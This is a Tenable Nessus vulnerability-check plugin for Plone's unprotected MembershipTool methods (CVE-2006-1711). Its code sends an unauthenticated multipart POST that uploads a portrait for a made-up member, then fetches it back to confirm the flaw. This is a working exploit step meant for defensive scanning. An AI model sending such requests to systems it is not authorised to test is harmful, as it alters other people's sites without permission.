#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a Python application that is affected
by an access control failure. 

Description :

The remote host is running Plone, an open-source content manage system
written in Python. 

The version of Plone installed on the remote host does not limit
access to the 'changeMemberPortrait' and 'deletePersonalPortrait'
MembershipTool methods.  An unauthenticated attacker can leverage this
issue to delete member portraits or add / update portraits with
malicious content. 

See also :

http://dev.plone.org/plone/ticket/5432

Solution :

Either install Hotfix 2006-04-10 1.0 or upgrade to Plone version 2.0.6
/ 2.1.3 / 2.5-beta2 when they become available. 

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";


if (description)
{
  script_id(21219);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-1711");
  script_bugtraq_id(17484);

  script_name(english:"Plone Unprotected MembershipTool Methods Vulnerability");
  script_summary(english:"Tries to change profiles using Plone");

  script_description(english:desc);

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);


# Make sure Plone is installed and the affected script exists.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || !egrep(pattern:"Server:.* Plone/", string:banner)) exit(0);
}

url = "/portal_membership/changeMemberPortrait";
req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# If so...
if (
  '<meta name="generator" content="Plone' >< res &&
  "The parameter, <em>portrait</em>, was omitted from the request" >< res
)
{
  # Upload a profile for a non-existent user.
  user = string(SCRIPT_NAME, "-", unixtime());
  portrait = rand_str();

  boundary = "nessus";
  req = string(
    "POST ",  url, " HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "User-Agent: Mozilla/4.75 [en] (X11, U; Nessus)\r\n",
    "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
    # nb: we'll add the Content-Length header and post data later.
  );
  boundary = string("--", boundary);
  postdata = string(
    boundary, "\r\n", 
   'Content-Disposition: form-data; name="portrait"; filename="', user, '.gif"', "\r\n",
    "Content-Type: image/gif\r\n",
    "\r\n",
    portrait, "\r\n",

    boundary, "\r\n", 
    'Content-Disposition: form-data; name="member_id"', "\r\n",
    "\r\n",
    user, "\r\n",

    boundary, "--", "\r\n"
  );
  req = string(
    req,
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # Retrieve the newly-created portrait.
  req = http_get(item:string("/portal_memberdata/portraits/", user), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we get our portrait content back.
  if (portrait == res) security_note(port);
}
